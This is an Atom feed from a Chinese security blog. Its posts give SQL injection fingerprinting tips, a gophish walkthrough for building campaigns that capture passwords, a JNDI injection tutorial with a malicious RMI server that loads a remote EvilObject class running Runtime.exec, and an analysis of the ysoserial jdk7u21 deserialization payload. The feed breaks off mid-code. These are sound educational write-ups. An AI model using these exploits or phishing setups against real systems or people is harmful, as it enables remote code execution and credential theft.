<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ConsT27&#39;s Blog</title>
  
  
  <link href="http://const27.com/atom.xml" rel="self"/>
  
  <link href="http://const27.com/"/>
  <updated>2021-05-04T07:51:24.714Z</updated>
  <id>http://const27.com/</id>
  
  <author>
    <name>ConsT27</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>sql注入判断不同数据库的tips</title>
    <link href="http://const27.com/2021/05/23/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/"/>
    <id>http://const27.com/2021/05/23/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/</id>
    <published>2021-05-23T06:44:46.917Z</published>
    <updated>2021-05-04T07:51:24.714Z</updated>
    
    <content type="html"><![CDATA[<h1 id="经验之谈"><a href="#经验之谈" class="headerlink" title="经验之谈"></a>经验之谈</h1><p>Asp和.net通常使用sqlserver</p><p>Php通常使用mysql或者postgresql</p><p>Java通常是oracle或mysql</p><p>Iis服务器是基于windows的架构，后台数据库有可能是sqlserver</p><p>Apache服务器，可能使用开源数据库mysql或postgresql</p><h1 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ORACLE：&#39;a&#39;||&#39;a&#39; &#x3D;aa</span><br><span class="line">MS-SQL：&#39;a&#39;+&#39;a&#39; &#x3D;aa</span><br><span class="line">MYSQL：&#39;a&#39; &#39;a&#39; &#x3D;aa</span><br></pre></td></tr></table></figure><h1 id="特有函数"><a href="#特有函数" class="headerlink" title="特有函数"></a>特有函数</h1><h2 id="时间延迟函数"><a href="#时间延迟函数" class="headerlink" title="时间延迟函数"></a>时间延迟函数</h2><p>oracle: 使用UTL_HTTP向一个不存在的ip发起链接请求，若返回页面大幅度延迟则可判定为oracle</p><p>mssql:使用语句 waitfor delay ‘0:0:10’ 若返回页面大幅度延迟则可判定为mssql</p><p>mysql: sleep函数来产生延迟</p><h2 id="mysql特有函数"><a href="#mysql特有函数" class="headerlink" title="mysql特有函数"></a>mysql特有函数</h2><p>BENCHMARK. 用于测试特定操作的执行速度<br>select BENCHMARK(1000000,md5(‘admin’)) </p><h1 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h1><p>尝试让语句报错，从错误信息中获取数据库信息</p><h1 id="版本信息"><a href="#版本信息" class="headerlink" title="版本信息"></a>版本信息</h1><p><img src="https://pic4.zhimg.com/v2-69d02936bc7f7769a3709be6aa196f4f_r.jpg" alt="preview"></p><h1 id="系统表"><a href="#系统表" class="headerlink" title="系统表"></a>系统表</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mssql:(select count(*) from sysobjects)&gt;0</span><br><span class="line">access: (select count(*) from msysobjects)&gt;0</span><br><span class="line">mysql:(select count(*) from information_schema.TABLES)&gt;0</span><br><span class="line">orcle:(select count(*) from sys.user_tables)&gt;0</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;经验之谈&quot;&gt;&lt;a href=&quot;#经验之谈&quot; class=&quot;headerlink&quot; title=&quot;经验之谈&quot;&gt;&lt;/a&gt;经验之谈&lt;/h1&gt;&lt;p&gt;Asp和.net通常使用sqlserver&lt;/p&gt;
&lt;p&gt;Php通常使用mysql或者postgresql&lt;/p&gt;
&lt;p&gt;J</summary>
      
    
    
    
    
    <category term="外围打点" scheme="http://const27.com/tags/%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>gophish钓鱼</title>
    <link href="http://const27.com/2021/04/01/gophish%E4%BD%BF%E7%94%A8/"/>
    <id>http://const27.com/2021/04/01/gophish%E4%BD%BF%E7%94%A8/</id>
    <published>2021-04-01T04:00:00.000Z</published>
    <updated>2021-04-01T05:20:40.315Z</updated>
    
    <content type="html"><![CDATA[<p>gophish，强大且著名的钓鱼框架。</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>略</p><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>config.json</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210401122344402.png" alt="image-20210401122344402"></p><p>第一个箭头指向后台登陆界面<br>第二个界面指向钓鱼网页界面</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>进来后台后是这样<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331205436142.png" alt="image-20210331205436142"></p><p>左侧栏有很多功能点</p><h2 id="Sending-Profiles"><a href="#Sending-Profiles" class="headerlink" title="Sending Profiles"></a>Sending Profiles</h2><p>这个功能是拿来发送邮件的</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331205557502.png" alt="image-20210331205557502"></p><p>我们由上到下说说这些选项</p><p>Name:这个钓鱼邮件策略的名字，不会出现在真正的钓鱼邮件中<br>From:钓鱼邮件发件人。 此处我们拿qq邮箱做实验，这里填个 <a href="mailto:&#120;&#120;&#x78;&#x78;&#64;&#x71;&#113;&#46;&#x63;&#x6f;&#109;">&#120;&#120;&#x78;&#x78;&#64;&#x71;&#113;&#46;&#x63;&#x6f;&#109;</a><br>Host:邮件服务器，因为是拿qq邮箱做实验，填qq邮箱的smtp服务器:qq.smtp.com:465<br>Username: 在smtp服务器进行验证时，需要提供的用户名凭据。 qq邮箱举例的话，就是自己的qq邮箱号<br>Password:密码凭据，qq邮箱举例的话，就是 qq邮箱-&gt;设置-&gt;开启smtp服务-&gt;生成授权码，  填授权码于此处</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331205944399.png" alt="image-20210331205944399"></p><p>Email-Header（可选）: Email Headers 是自定义邮件头字段，例如邮件头的 <code>X - Mailer </code>字段，若不修改此字段的值，通过gophish发出的邮件，其邮件头的X-Mailer的值默认为gophish。</p><p>填完后点击下方发送按钮</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331210111549.png" alt="image-20210331210111549"></p><p>填上要发送至哪个邮箱，然后点send即可完成发送</p><h2 id="Landing-Pages"><a href="#Landing-Pages" class="headerlink" title="Landing Pages"></a>Landing Pages</h2><p>制作钓鱼页面</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331210240126.png" alt="image-20210331210240126"></p><p>Name:此次策略的名称</p><p>Import Site: 复制一个网站的HTML内容</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331210313748.png" alt="image-20210331210313748"></p><p>Capture Submitted Data：勾选后会出现两个参数</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331210917680.png" alt="image-20210331210917680"></p><p>首先Capture Submitted Data本身是统计有多少人点进了这个钓鱼界面<br>Capture Passwords 是从登录框中获得账户密码等信息<br>Redirect to 是用户submit信息后跳转到哪个页面（增强隐蔽性）</p><h2 id="Email-Templates"><a href="#Email-Templates" class="headerlink" title="Email Templates"></a>Email Templates</h2><p>钓鱼邮件模板</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331211102719.png" alt="image-20210331211102719"></p><p>Name：此次策略的名字</p><p>生成邮件模板有两种模式：Import Email 和自写</p><p>import Email:</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331211247727.png" alt="image-20210331211247727"></p><p>Change Links to Point to Landing Page  勾选后，导入的邮件内容的超链接会全部替换成设置好的钓鱼页面</p><p>自写：</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331211418192.png" alt="image-20210331211418192"></p><p>Add Tracking Image勾选后会在邮件中内嵌一个图片，通过图片被加载的方式来统计有多少人点开了此钓鱼邮件<br>Add Files就是往内容中添加文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">注意，要想在邮件中嵌入钓鱼页面，钓鱼页面的url应该填写为&#123;&#123;.URL&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="Users-amp-Groups"><a href="#Users-amp-Groups" class="headerlink" title="Users&amp;Groups"></a>Users&amp;Groups</h2><p>大范围选定邮件接收者</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331211938205.png" alt="image-20210331211938205"></p><p>bulk imoprt users  从csv文件中导入用户信息</p><p>下面是单个添加用户信息</p><h2 id="Campaigns"><a href="#Campaigns" class="headerlink" title="Campaigns *"></a>Campaigns *</h2><p>将以上四个事件联系起来，组成完整的钓鱼。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331212153662.png" alt="image-20210331212153662"></p><p>Name:策略名<br>Email Template：选定一个邮件模板<br>Landing Page：选定一个钓鱼界面<br>URL：URL 是用来替换选定钓鱼邮件模板中超链接的值. 一般填gophish服务器的ip即可<br>Launch Date：钓鱼行动开始时间<br>（可选）Send Emails By：钓鱼行动结束时间<br>Sending Profile：选一个发送策略<br>Groups：选定接收钓鱼邮件的用户组</p><p>接下来就可以在Dashboard界面看钓鱼行动的结果了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;gophish，强大且著名的钓鱼框架。&lt;/p&gt;
&lt;h1 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h1&gt;&lt;p&gt;略&lt;/p&gt;
&lt;h1 id=&quot;配置&quot;&gt;&lt;a href=&quot;#配置&quot; class=&quot;head</summary>
      
    
    
    
    
    <category term="钓鱼" scheme="http://const27.com/tags/%E9%92%93%E9%B1%BC/"/>
    
  </entry>
  
  <entry>
    <title>JNDI注入</title>
    <link href="http://const27.com/2021/03/31/JNDI%E6%B3%A8%E5%85%A5/"/>
    <id>http://const27.com/2021/03/31/JNDI%E6%B3%A8%E5%85%A5/</id>
    <published>2021-03-31T06:03:18.833Z</published>
    <updated>2021-03-31T06:02:26.329Z</updated>
    
    <content type="html"><![CDATA[<p>JNDI注入依赖RMI，所以在学习JNDI注入前务必了解一下RMI</p><h1 id="JNDI-简介"><a href="#JNDI-简介" class="headerlink" title="JNDI 简介"></a>JNDI 简介</h1><p>JNDI (Java Naming and Directory Interface) 是一个java中的技术，用于提供一个访问各种资源的接口。比如通过JNDI可以在局域网上定位一台打印机，或者定位数据库服务，远程JAVA对象等。<br>JNDI底层支持RMI远程对象，RMI注册的服务可以直接被JNDI接口访问调用。</p><h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><h2 id="RMI工作原理"><a href="#RMI工作原理" class="headerlink" title="RMI工作原理"></a>RMI工作原理</h2><p>首先我们先思考一下RMI的工作原理是什么。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.服务器创建好继承于Remote接口的类，并把它绑定到RMI服务器上</span><br><span class="line">2.客户端请求RMI服务器上的类</span><br><span class="line">3.服务端返回客户端所请求类的存根stub，客户端将这个stub看作实例化对象使用</span><br><span class="line">4.客户端调用stub的某个方法，并传入参数。该参数会发送到RMI服务器上，由RMI服务器按照客户端传来的参数来执行指定的方法</span><br><span class="line">5.服务器执行完后将结果返回给客户端</span><br></pre></td></tr></table></figure><p>所以从RMI这一端来看，客户端获取了远程对象后所执行的此对象的方法，都是由RMI服务器来执行的。</p><h2 id="JNDI-与-RMI-的区别"><a href="#JNDI-与-RMI-的区别" class="headerlink" title="JNDI 与 RMI 的区别"></a>JNDI 与 RMI 的区别</h2><p>rmi调用远程对象和JNDI调用远程对象，在代码上是有差别的</p><p>如下是RMI创建和调用远程对象</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.rmi.Naming;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line">import java.util.Properties;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line">interface IHello extends Remote &#123;</span><br><span class="line">    public String sayHello(String name) throws RemoteException;</span><br><span class="line">&#125;</span><br><span class="line">class IHelloImpl extends UnicastRemoteObject implements IHello &#123;</span><br><span class="line">    protected IHelloImpl() throws RemoteException &#123;</span><br><span class="line">        super();</span><br><span class="line">    &#125;</span><br><span class="line">    public String sayHello(String name) throws RemoteException &#123;</span><br><span class="line">        return &quot;Hello &quot; + name + &quot; ^_^ &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public class CallService &#123;</span><br><span class="line">    public static void main(String args[]) throws Exception &#123;</span><br><span class="line">        IHello hello &#x3D; new IHelloImpl();</span><br><span class="line">        Naming.bind(&quot;hello&quot;, hello);</span><br><span class="line">        </span><br><span class="line">        IHello rHello &#x3D; (IHello) Naming.lookup(&quot;hello&quot;);</span><br><span class="line">        System.out.println(rHello.sayHello(&quot;RickGray&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而JNDI调用远程对象的过程如下，多了一步设置JNDI环境</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line">import java.util.Properties;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line">interface IHello extends Remote &#123;</span><br><span class="line">    public String sayHello(String name) throws RemoteException;</span><br><span class="line">&#125;</span><br><span class="line">class IHelloImpl extends UnicastRemoteObject implements IHello &#123;</span><br><span class="line">    protected IHelloImpl() throws RemoteException &#123;</span><br><span class="line">        super();</span><br><span class="line">    &#125;</span><br><span class="line">    public String sayHello(String name) throws RemoteException &#123;</span><br><span class="line">        return &quot;Hello &quot; + name + &quot; ^_^ &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public class CallService &#123;</span><br><span class="line">    public static void main(String args[]) throws Exception &#123;</span><br><span class="line">        &#x2F;&#x2F; 配置 JNDI 默认设置</span><br><span class="line">        Properties env &#x3D; new Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">                &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);</span><br><span class="line">        env.put(Context.PROVIDER_URL,</span><br><span class="line">                &quot;rmi:&#x2F;&#x2F;localhost:1022&quot;);</span><br><span class="line">        Context ctx &#x3D; new InitialContext(env);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 本地开启 1022 端口作为 RMI 服务，并以标识 &quot;hello&quot; 绑定方法对象</span><br><span class="line">        Registry registry &#x3D; LocateRegistry.createRegistry(1022);</span><br><span class="line">        IHello hello &#x3D; new IHelloImpl();</span><br><span class="line">        registry.bind(&quot;hello&quot;, hello);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; JNDI 获取 RMI 上的方法对象并进行调用</span><br><span class="line">        IHello rHello &#x3D; (IHello) ctx.lookup(&quot;hello&quot;);</span><br><span class="line">        System.out.println(rHello.sayHello(&quot;tom&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h2><p>首先来看一下如何创建一个对象Reference并将其绑定到RMI服务器上</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">......定义好了registry，它是一个Registry对象（RMI中用于将类注册到服务器上的对象）</span><br><span class="line">Reference refObj &#x3D; new Reference(&quot;refClassName&quot;, &quot;insClassName&quot;, &quot;http:&#x2F;&#x2F;a.com:12345&quot;);</span><br><span class="line">ReferenceWrapper refObjWrapper &#x3D; new ReferenceWrapper(refObj);</span><br><span class="line">registry.bind(&quot;refObj&quot;, refObjWrapper);</span><br></pre></td></tr></table></figure><p>前面说到RMI服务器会向客户端返回stub或者说一个对象，如果RMI服务器传回客户端一个Reference对象呢？那就要说道说道了。<br>对于RMI服务器而言，向客户端传回一个Reference对象和传回其他对象一样，并没有多大区别。<br>但是客户端由于获取到了一个Reference实例，比如说就是上面代码中的Reference实例，接下来客户端就会先在CLASSPATH里寻找被标识为refClassName的类。如果没找到，它就会去请求<a href="http://a.com:12345/refClassName.class">http://a.com:12345/refClassName.class</a> 对里面的类进行动态加载，并调用insClassName类的构造方法。注意，调用insClassName类的构造方法这个行为是由客户端完成的。</p><p>上面的一系列行为可以概括为xiatu<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210324014723682.png" alt="image-20210324014723682"></p><h2 id="JNDI-协议转换"><a href="#JNDI-协议转换" class="headerlink" title="JNDI 协议转换"></a>JNDI 协议转换</h2><p>我们在通过JNDI调用远程对象时，需要设置环境，就像这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Properties env &#x3D; new Properties();</span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">        &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);  &#x2F;&#x2F;设置了rmi请求方式</span><br><span class="line">env.put(Context.PROVIDER_URL,</span><br><span class="line">        &quot;rmi:&#x2F;&#x2F;localhost:1099&quot;);</span><br><span class="line">Context ctx &#x3D; new InitialContext(env);</span><br></pre></td></tr></table></figure><p>比如以上代码，就设置了JNDI会通过rmi的方式去请求远程对象。</p><p>但是当调用lookup()或者search()时，可以直接无视环境是如何设置请求方式的，因为JNDI有协议动态转换机制。什么意思呢？看看代码就晓得了</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Properties env &#x3D; new Properties();</span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">        &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);</span><br><span class="line">env.put(Context.PROVIDER_URL,</span><br><span class="line">        &quot;rmi:&#x2F;&#x2F;localhost:1099&quot;);</span><br><span class="line">Context ctx &#x3D; new InitialContext(env);</span><br><span class="line">ctx.lookup(&quot;ldap:&#x2F;&#x2F;a.com&#x2F;ou&#x3D;foo,dc&#x3D;foobar,dc&#x3D;com&quot;)</span><br></pre></td></tr></table></figure><p>以上代码执行后，会调用ldap协议去请求，而不是rmi。<br>这是因为lookup或者search函数在参数为绝对路径URI的情况下动态转换协议为参数中指定的协议。</p><h2 id="JNDI注入-1"><a href="#JNDI注入-1" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>如果我们满足以下条件，JNDI注入就会成功</p><p>JNDI调用的lookup参数可控<br>URI可进行动态协议转换<br>Reference对象指定类会被加载并实例化</p><p>其实最重要的就是第一条。</p><p>下面用一张图概括从JNDI注入到RCE的流程</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210324141937091.png" alt="image-20210324141937091"></p><p>1.攻击者控制了lookup参数<br>2.攻击者将lookup参数替换为去请求恶意服务器A上的Reference对象<br>3.恶意服务器A返回Reference对象<br>4.受害机器获得Reference对象后先在CLASSPATH中查找Reference对象中的指定类是否存在，若不存在则请求Reference对象中指定的恶意服务器B去获得指定类<br>5.恶意服务器B返回指定类<br>6.受害机器得到指定类后，执行指定类的构造函数，从而达到RCE</p><p>下面是代码实现</p><p>受害机器</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line">interface IHello extends Remote &#123;</span><br><span class="line">    abstract String sayHello(String name) throws RemoteException;</span><br><span class="line">&#125;</span><br><span class="line">public class CallService &#123;</span><br><span class="line">    public static void main(String args[]) throws Exception&#123;</span><br><span class="line">        if(args.length&lt;1)&#123;</span><br><span class="line">            System.out.println(&quot;Plz input url&quot;);</span><br><span class="line">            System.exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            &#x2F;&#x2F; JNDI 获取 RMI 上的方法对象并进行调用</span><br><span class="line">            Context ctx &#x3D; new InitialContext();</span><br><span class="line">            IHello rHello &#x3D; (IHello) ctx.lookup((String)args[0]);</span><br><span class="line">            System.out.println(rHello.sayHello(&quot;tom&quot;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RMI</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line">import javax.naming.Reference;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.*;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class evilrmi &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        Registry registry &#x3D; LocateRegistry.createRegistry(1010);</span><br><span class="line">        Reference refObj &#x3D; new Reference(&quot;EvilObject&quot;,&quot;EvilObject&quot;,&quot;http:&#x2F;&#x2F;192.168.111.1:80&#x2F;&quot;);</span><br><span class="line">        ReferenceWrapper refObjWra &#x3D; new ReferenceWrapper(refObj);</span><br><span class="line">        registry.bind(&quot;refObj&quot;,refObjWra);</span><br><span class="line">        System.out.println(&quot;gogo&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>EvilObject</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class EvilObject &#123;</span><br><span class="line">    public EvilObject() throws Exception &#123;</span><br><span class="line">        Runtime rt &#x3D; Runtime.getRuntime();</span><br><span class="line">        String[] commands &#x3D; &#123;&quot;calc&quot;&#125;;</span><br><span class="line">        Process pc &#x3D; rt.exec(commands);</span><br><span class="line">        pc.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先运行RMI服务器，然后把EvilObject.class放置于<a href="http://192.168.111.1/%E4%B8%8B%EF%BC%8C%E7%84%B6%E5%90%8E%E6%8C%87%E5%AE%9Alookup%E5%8F%82%E6%95%B0%E4%B8%BA%E6%88%91%E4%BB%AC%E7%9A%84%E6%81%B6%E6%84%8FRMI%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8E%BB%E8%BF%90%E8%A1%8C%E5%8F%97%E5%AE%B3%E6%9C%BA%E5%99%A8%E3%80%82">http://192.168.111.1:80/下，然后指定lookup参数为我们的恶意RMI服务器去运行受害机器。</a></p><p>如果是早期JDK版本，计算器就已经弹出来了。JDK 6u141, JDK 7u131, JDK 8u121 以及更高版本中Java提升了JNDI 限制了Naming/Directory服务中JNDI Reference<strong>远程</strong>加载Object Factory类的特性，所以会执行以上流程会有如下报错</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The object factory is untrusted. Set the system property &#39;com.sun.jndi.rmi.object.trustURLCodebase&#39; to &#39;true&#39;.</span><br></pre></td></tr></table></figure><p>系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。</p><p>以上是JNDI Reference+RMI的利用方式，除此之外还有一个JNDI Reference+ldap 的利用方式，操作与JNDI Reference+RMI大同小异，也就是通过ldap协议lookup一个恶意服务器并获得恶意Reference对象，并且LDAP服务的Reference远程加载Factory类不受 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以利用面更广<br>但是在Oracle JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false，还对应的分配了一个漏洞编号CVE-2018-3149。</p><h1 id="JNDI注入：高版本如何利用？"><a href="#JNDI注入：高版本如何利用？" class="headerlink" title="JNDI注入：高版本如何利用？"></a>JNDI注入：高版本如何利用？</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;JNDI注入依赖RMI，所以在学习JNDI注入前务必了解一下RMI&lt;/p&gt;
&lt;h1 id=&quot;JNDI-简介&quot;&gt;&lt;a href=&quot;#JNDI-简介&quot; class=&quot;headerlink&quot; title=&quot;JNDI 简介&quot;&gt;&lt;/a&gt;JNDI 简介&lt;/h1&gt;&lt;p&gt;JNDI (Jav</summary>
      
    
    
    
    
    <category term="java开发与安全" scheme="http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>7u21链</title>
    <link href="http://const27.com/2021/03/31/jdk7u21%E9%93%BE/"/>
    <id>http://const27.com/2021/03/31/jdk7u21%E9%93%BE/</id>
    <published>2021-03-31T06:03:16.453Z</published>
    <updated>2021-03-31T06:02:40.588Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>jdk7u21 链，是一个不需要借助第三方库就能实现的链。影响版本&lt;=7u21</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="from-ysonerial"><a href="#from-ysonerial" class="headerlink" title="from ysonerial"></a>from ysonerial</h2><p>我们先来看看ysonerial里的payload是怎么写的，然后沿着其思路进行分析</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public Object getObject(String command) throws Exception &#123;</span><br><span class="line">    Object templates &#x3D; Gadgets.createTemplatesImpl(command);</span><br><span class="line">    String zeroHashCodeStr &#x3D; &quot;f5a5a608&quot;;</span><br><span class="line">    HashMap map &#x3D; new HashMap();</span><br><span class="line">    map.put(zeroHashCodeStr, &quot;foo&quot;);</span><br><span class="line">    InvocationHandler tempHandler &#x3D; (InvocationHandler)Reflections.getFirstCtor(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).newInstance(Override.class, map);</span><br><span class="line">    Reflections.setFieldValue(tempHandler, &quot;type&quot;, Templates.class);</span><br><span class="line">    Templates proxy &#x3D; (Templates)Gadgets.createProxy(tempHandler, Templates.class, new Class[0]);</span><br><span class="line">    LinkedHashSet set &#x3D; new LinkedHashSet();</span><br><span class="line">    set.add(templates);</span><br><span class="line">    set.add(proxy);</span><br><span class="line">    Reflections.setFieldValue(templates, &quot;_auxClasses&quot;, (Object)null);</span><br><span class="line">    Reflections.setFieldValue(templates, &quot;_class&quot;, (Object)null);</span><br><span class="line">    map.put(zeroHashCodeStr, templates);</span><br><span class="line">    return set;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>我们看到，ysonerial的payload上来就通过Gadgets.createTemplatesImpl(command) 试图创建一个TemplatesImpl类。<br>createTemplatesImpl源码如下，我们发现创建TemplatesImpl类后又通过反射和javassist做了许多操作。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static &lt;T&gt; T createTemplatesImpl(String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory) throws Exception &#123;</span><br><span class="line">    T templates &#x3D; tplClass.newInstance();</span><br><span class="line">    ClassPool pool &#x3D; ClassPool.getDefault();</span><br><span class="line">    pool.insertClassPath(new ClassClassPath(Gadgets.StubTransletPayload.class));</span><br><span class="line">    pool.insertClassPath(new ClassClassPath(abstTranslet));</span><br><span class="line">    CtClass clazz &#x3D; pool.get(Gadgets.StubTransletPayload.class.getName());</span><br><span class="line">    String cmd &#x3D; &quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot; + command.replaceAll(&quot;\\\\&quot;, &quot;\\\\\\\\&quot;).replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;) + &quot;\&quot;);&quot;;</span><br><span class="line">    clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">    clazz.setName(&quot;ysoserial.Pwner&quot; + System.nanoTime());</span><br><span class="line">    CtClass superC &#x3D; pool.get(abstTranslet.getName());</span><br><span class="line">    clazz.setSuperclass(superC);</span><br><span class="line">    byte[] classBytes &#x3D; clazz.toBytecode();</span><br><span class="line">    Reflections.setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;classBytes, ClassFiles.classAsBytes(Gadgets.Foo.class)&#125;);</span><br><span class="line">    Reflections.setFieldValue(templates, &quot;_name&quot;, &quot;Pwnr&quot;);</span><br><span class="line">    Reflections.setFieldValue(templates, &quot;_tfactory&quot;, transFactory.newInstance());</span><br><span class="line">    return templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么为什么要创建这个类并且调用反射和javassist机制呢？先不急，我们看一下TemplatesImpl源码。</p><p>首先TemplatesImpl类中有个方法defineTransletClasses，它的主要代码如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private byte[][] _bytecodes &#x3D; (byte[][])null;</span><br><span class="line"></span><br><span class="line">private void defineTransletClasses() throws TransformerConfigurationException &#123;</span><br><span class="line">        if (this._bytecodes &#x3D;&#x3D; null) &#123;</span><br><span class="line">.....</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            